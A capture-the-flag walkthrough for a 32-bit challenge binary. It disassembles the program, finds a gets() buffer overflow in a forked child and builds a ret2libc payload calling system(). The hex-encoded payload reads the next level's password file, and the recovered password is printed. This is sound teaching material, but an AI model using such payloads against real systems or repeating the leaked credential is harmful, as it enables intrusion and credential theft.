# level04 walkthrough

Given 32-bit binary, lets disassemble the main function:

    Dump of assembler code for function main:
    0x080486c8 <+0>:	push   ebp
    0x080486c9 <+1>:	mov    ebp,esp
    0x080486cb <+3>:	push   edi
    0x080486cc <+4>:	push   ebx
    0x080486cd <+5>:	and    esp,0xfffffff0
    0x080486d0 <+8>:	sub    esp,0xb0
    0x080486d6 <+14>:	call   0x8048550 <fork@plt>
    0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
    0x080486e2 <+26>:	lea    ebx,[esp+0x20]
    0x080486e6 <+30>:	mov    eax,0x0
    0x080486eb <+35>:	mov    edx,0x20
    0x080486f0 <+40>:	mov    edi,ebx
    0x080486f2 <+42>:	mov    ecx,edx
    0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
    0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
    0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
    0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
    0x08048711 <+73>:	jne    0x8048769 <main+161>

In the first part we can see buffer allocation on stack and a fork function call which is going to create second process, split stack in half and continue execution for both processes from the next instruction. fork function returns 0 for the parent process and a non zero value for the child, this value is being stored in `esp+0xac`. Next we can see a buffer being cleared for both processes and a conditional jump to `main+161` for the parent process.
Let's check what's happening in the child process first:


    0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
    0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
    0x08048722 <+90>:	call   0x8048540 <prctl@plt>
    0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
    0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
    0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
    0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
    0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
    0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
    0x08048752 <+138>:	call   0x8048500 <puts@plt>
    0x08048757 <+143>:	lea    eax,[esp+0x20]
    0x0804875b <+147>:	mov    DWORD PTR [esp],eax
    0x0804875e <+150>:	call   0x80484b0 <gets@plt>
    0x08048763 <+155>:	jmp    0x804881a <main+338>

Here we can immediately spot a gets function call that reads a string of ANY size into buffer at `esp+0x20` so it can be exploited to override the return address.

---
**NOTE**

Since we're going to exploit the child process we need to run `set follow-fork-mode child` in gdb to examine the stack

---

Meanwhile in the main process there is an infinite loop that checks the status of the child process and it's eip address, if it detects that eip address is set to 0xb (exec syscall) then it kills it. This means that we can't use the default shellcode and we need to find something else, lets check which functions are linked to the binary:

    (gdb) info function system
    All functions matching regular expression "system":

    Non-debugging symbols:
    0xf7e6aed0  __libc_system
    0xf7e6aed0  system
    0xf7f48a50  svcerr_systemerr

Here we can see libc system function which can be used in ret2libc attack.
Lets calculate the return address as usual 0xb0-0x20+3*4=156 bytes.
Now let's generate shellcode using the [helper script](Resources/pwner.py) and execute it:

    python -c 'print(b"\x63\x61\x74\x20\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\x60\xdd\xff\xff")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 /home/users/level04/level04
    Give me some shellcode, k
    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

Et voilà!
